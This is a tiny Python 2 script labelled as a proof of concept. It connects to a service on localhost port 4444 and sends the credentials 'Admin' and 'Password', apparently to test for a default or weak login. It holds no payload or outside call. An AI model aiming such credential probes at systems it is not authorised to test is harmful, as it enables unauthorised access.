#POC

import socket,sys
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4444))
print s.recv(1024)
s.send("Admin" + "\r\n")
print s.recv(1024)
s.send("Password" + "\r\n")
print s.recv(1024)
s.close()